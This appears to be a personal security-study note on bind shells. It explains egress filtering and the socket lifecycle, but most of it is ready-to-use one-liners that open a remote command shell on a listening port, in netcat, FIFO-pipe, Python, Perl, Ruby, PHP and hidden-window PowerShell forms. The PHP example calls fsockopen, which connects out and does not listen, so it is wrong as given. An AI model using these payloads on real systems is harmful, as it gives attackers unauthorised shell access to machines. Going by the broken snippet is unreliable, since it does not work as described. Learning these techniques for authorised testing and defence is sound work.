---
created: 2026-09-08
updated: 2026-10-01
tags:
  - shells
---
// every sentence must make sense!
## Bind shell

>A **bind shell** is a type of remote shell where the **target machine** binds a command shell (e.g., `/bin/bash` or `cmd.exe`) to a specific listening port. You the connect to that port from your own machine to obtain a command-line interface.

>[!note] This is the opposite of a reverse shell, where the target connects back to a listener on your machine. See [[Reverse shells]].

- The primary use case for a bind shell is to work around **egress filtering**.
- Many enterprise networks prevent internal servers from initiating outbound connections, so a reverse shell has no way to connect back to your machine (unless it's a pivot inside the target network).
- Inbound rules may be less restrictive, especially when the target is already exposed to the internet (e.g., a web server). In that situation, forcing the target to listen may be the only viable way to get a shell.

>[!warning] A bind shell binds directly to a target port, so it only works when that port is reachable from your host. In cases where firewalls block inbound connections, or the target is behind NAT, [[Reverse shells]] are more practical.

## Bind shell with Netcat

- Bind shell with Netcat:

```bash
nc -lvp 1337 -e /bin/bash
```

>[!interesting]+ How this bind shell works
>- `-l` puts Netcat in listener mode: it waits for an incoming connection instead of initiating one.
>- `-p 1337` sets the port (`1337`) to listen on. Netcat **binds** to that port.
>- `-e /bin/bash` executes `/bin/bash` once a connection is established and attaches its `stdin`, `stdout`, and `stderr` to the socket. 

>[!note] Because the `-e` option can turn any connection into a shell, it is often removed from Netcat builds.

>[!note] The shell runs with the privileges of the user who started Netcat.

- Connect to the shell from your attacking machine using:

```bash
nc -nv <target> 1337
```

>[!note] The `-v` flag provides verbose output and shows the connection status. The `-n` flag disables DNS resolution.

>[!warning] For a bind shell to work, the target must be reachable on the specified port (e.g., TCP port `1337` must not be blocked).

## Netcat and pipes

- If the `-e` flag is not available, you can build a bind shell using named pipes (FIFOs):

```bash
mkfifo /tmp/pipefile; \
nc -lvnp 1337 < /tmp/pipefile | /bin/sh > /tmp/pipefile 2>&1; \
rm /tmp/pipefile
```

>[!interesting]- How this bind shell works
> - `mkfifo /tmp/pipefile`
> 	- Creates a [named pipe](https://www.linuxjournal.com/article/2156) (FIFO) at `/tmp/pipefile`: a special file that acts as a bidirectional communication channel between two processes.
> 	- Anything one process writes to the pipe can be read by another, and vice versa.
> ---
> - `nc -lvnp 1337 < /tmp/pipefile`
> 	- Starts a Netcat listener (`-l`) on port `1337` (`-p 1337`), in verbose mode (`-v`) with DNS resolution disabled (`-n`).
> 	- `< /tmp/pipefile` tells Netcat to read its standard input from the named pipe. Any data written to `/tmp/pipefile` is sent over the network to whoever is connected (the attacker).
> ---
> - `| /bin/sh`
> 	- The pipe operator `|` feeds Netcat's output — all data received from the network — into `/bin/sh`, which executes it as shell commands.
> 	- When the attacker types a command and sends it, Netcat receives it and passes it to `/bin/sh` for execution.
> ---
> - `> /tmp/pipefile 2>&1`
> 	- Redirects both standard output (`>`) and standard error (`2>&1`) from the shell back into the named pipe.
> 	- The loop is now closed: commands from the attacker flow into the shell, and the shell's output flows back through the named pipe to Netcat, which transmits it to the attacker.
> ---
> - `rm /tmp/pipefile`
> 	- Removes the named pipe after the connection closes.

>[!info] Unlike anonymous pipes created with the `|` operator (which exist only in memory during a process's execution), named pipes persist as special files in the filesystem and can be opened by multiple processes.

## Netcat bind shell with persistence

- To make the bind shell restart if the connection drops:

```bash
while true; do nc -lvnp 1337 -e /bin/bash; sleep 2; done
```

- After each connection closes, the loop waits two seconds (to avoid rapid restarts) and launches Netcat again. This is useful in situations where connections may drop unexpectedly due to network issues.

## Python bind shell

- Python IPv4 bind shell one-liner:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1337));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash");s.close()'
```

>[!interesting]- The same shell, expanded and commented
> 
> ```python
> import socket  # network communication
> import os      # OS interactions
> import pty     # pseudo-terminal
> 
> # create a socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> 
> # bind the socket to all interfaces (0.0.0.0) on the chosen port (1337)
> s.bind(("0.0.0.0", 1337))
> 
> # listen for incoming connections, with a backlog queue size of 1
> s.listen(1)
> 
> # accept the first connection; c is the client socket, a is the client address
> c, a = s.accept()
> 
> # redirect stdin (fd 0) to the client socket
> os.dup2(c.fileno(), 0)
> 
> # redirect stdout (fd 1) to the client socket
> os.dup2(c.fileno(), 1)
> 
> # redirect stderr (fd 2) to the client socket
> os.dup2(c.fileno(), 2)
> 
> # spawn an interactive bash shell
> pty.spawn("/bin/bash")
> 
> # close the listening socket (the connection is already established)
> s.close()
> ```

- To understand this code, it helps to look at how a bind shell works under the hood. The steps below describe the network-socket lifecycle.

>[!interesting]- How bind shells work under the hood
> 1. **`socket()`: socket creation**
> 	- The OS creates a **socket**, given the communication domain (e.g., `AF_INET` for IPv4), the socket type (e.g., `SOCK_STREAM` for TCP), and the protocol (e.g., `IPPROTO_TCP`).
> 	- It returns a file descriptor (on Linux/Unix) that represents the socket.
> ---
> 2. **`bind()`: binding**
> 	- A socket is an abstract entity. To make it usable, you **bind it** to a specific network interface and port.
> 	- If the port is already in use, the `bind()` call fails.
> ---
> 3. **`listen()`: the listening queue**
> 	- Once the socket is bound, the OS starts listening on it with `listen()`.
> 	- The OS also creates a **backlog queue** for the socket. When a connection request arrives before the application has called `accept()`, the OS places it in this queue. The queue size is a parameter of the `listen()` call.
> 
>>[!info] The **backlog queue** size is the *maximum number of pending connections that can be queued for a listening socket before the system starts rejecting new incoming connections*.
> 
> ---
> 4. **`accept()`: accepting a connection**
> 	- `accept()` blocks the application until a connection request arrives in the backlog queue.
> 	- When a connection arrives, the OS does **not** reuse the listening socket for data transfer. Instead, it creates a **new socket** with its own file descriptor.
> 	- This new socket represents the specific connection to the remote client (your attacking machine).
> ---
> 5. **`fork()`: spawning a new process**
> 	- The listening application typically creates a child process to handle the new connection (`fork()` on Linux/Unix).
> 	- This lets the parent return to `accept()` immediately, ready for the next connection, while the child handles the current session.
> ---
> 6. **`exec()`: image replacement**
> 	- The child process replaces its own executable image with that of a shell (e.g., `/bin/bash`, `cmd.exe`, or `powershell.exe`) using `exec()`.
> ---
> 7. **`dup2()`: I/O redirection**
> 	- This is the step that turns a plain network connection into an interactive shell.
> 	- The child process's standard file descriptors are **duplicated** with `dup2()` and pointed at the connected socket's file descriptor:
> 		- **`stdin`, file descriptor `0` → reads from the socket.**
> 		- **`stdout`, file descriptor `1` → writes to the socket.**
> 		- **`stderr`, file descriptor `2` → writes to the socket.**
> 	- Any command the attacker types is sent over the network and becomes `stdin` for the shell on the target. Any output or error the command produces is written to the shell's `stdout` and `stderr`, which are piped back across the network to the attacker's terminal.

- IPv4, using `subprocess` instead of `pty`:

```bash
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1337));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

- IPv4, `subprocess` with pipes:

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

- IPv6:

```bash
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.bind(("::1",1337,0,2));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## Perl bind shell

```bash
perl -MIO::Socket -e '$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,2);while(accept(C,S)){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

## Ruby bind shell

```bash
ruby -rsocket -e 'f=TCPServer.new("1337");c=f.accept;IO.dup2(c.fileno,0);IO.dup2(c.fileno,1);IO.dup2(c.fileno,2);exec "/bin/bash -i"'
```

```bash
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

## PHP bind shell

```bash
php -r '$sock=fsockopen("0.0.0.0",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## PowerShell bind shell

- One-liner for a non-interactive shell:

```PowerShell
powershell -NoP -NonI -W Hidden -c "$listener = New-Object System.Net.Sockets.TcpListener('[IP_ADDRESS]',1337);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

- With [`powercat`](https://github.com/besimorhino/powercat):

```bash
# listen on target:
. .\powercat.ps1
powercat -l -p 1337 -ep

# connect from attacker:
. .\powercat.ps1
powercat -c 127.0.0.1 -p 1337
```

## References and further reading

- [`Python reverse shell and bind shell Cheat Sheet — shelld3v`](https://github.com/shelld3v/Python-shell-cheat-sheet)
- [`Bind Shell — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#powershell)
